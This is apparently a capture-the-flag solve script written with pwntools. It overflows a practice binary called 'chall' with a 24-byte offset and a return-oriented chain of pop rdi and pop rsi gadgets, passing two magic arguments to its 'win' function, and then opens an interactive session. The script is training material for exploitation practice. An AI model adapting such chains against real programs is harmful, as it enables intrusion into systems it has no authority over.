#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
break win
c
'''.format(**locals())

poprdi = 0x000000000040116a
poprsi = 0x000000000040116c

io = start()

payload = flat({
    24: [
            
            poprdi, 0xdeadbeef,
            poprsi, 0xfeedf00d,
            poprdi+1,
            exe.sym.win,
            exe.sym.main
    ]
})

io.sendline(payload)

io.interactive()

